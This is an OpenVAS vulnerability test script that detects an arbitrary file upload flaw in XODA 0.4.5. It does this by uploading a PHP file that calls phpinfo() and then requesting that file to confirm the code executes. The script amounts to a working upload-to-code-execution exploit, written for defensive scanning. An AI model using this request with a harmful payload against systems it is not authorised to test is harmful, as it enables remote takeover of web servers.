###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xoda_55127.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# XODA Arbitrary File Upload and HTML Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103548");
  script_bugtraq_id(55127);
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:P");
  script_version("$Revision: 13994 $");
  script_name("XODA Arbitrary File Upload and HTML Injection Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55127");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-08-22 11:33:41 +0200 (Wed, 22 Aug 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"XODA is prone to an arbitrary file-upload vulnerability and multiple
  HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker could exploit these issues to execute arbitrary script
  code in a user's browser in the context of the affected site or execute arbitrary code on the server.");

  script_tag(name:"affected", value:"XODA 0.4.5 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) )
  exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/xoda", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  if( http_vuln_check( port:port, url:dir + '/?upload_to=', pattern:"<h4>Upload a file" ) ) {

    useragent = http_get_user_agent();
    vtstrings = get_vt_strings();
    file = vtstrings["lowercase_rand"] + ".php";
    ex = "<?php phpinfo(); ?>";
    len = 361 + strlen(file);

    req = string("POST ", dir, "/?upload HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
                 "DNT: 1\r\n",
                 "Connection: keep-alive\r\n",
                 "Referer: http://",host,"/xoda/?upload_to=\r\n",
                 "Content-Type: multipart/form-data; boundary=---------------------------161664008613401129571781664881\r\n",
                 "Content-Length: ",len,"\r\n",
                 "\r\n",
                 "-----------------------------161664008613401129571781664881\r\n",
                 'Content-Disposition: form-data; name="files_to_upload[]"; filename="',file,'"',"\r\n",
                 "Content-Type: application/x-php\r\n",
                 "\r\n",
                 "<?php phpinfo(); ?>\r\n",
                 "\r\n",
                 "-----------------------------161664008613401129571781664881\r\n",
                 'Content-Disposition: form-data; name="pwd"',"\r\n",
                 "\r\n",
                 "\r\n",
                 "-----------------------------161664008613401129571781664881--\r\n");
    res = http_keepalive_send_recv( data:req, port:port );

    if( "Location:" >< res ) {

      url = dir + '/files/' + file;
      req = http_get( item:url, port:port );
      buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

      if( "<title>phpinfo()" >< buf ) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );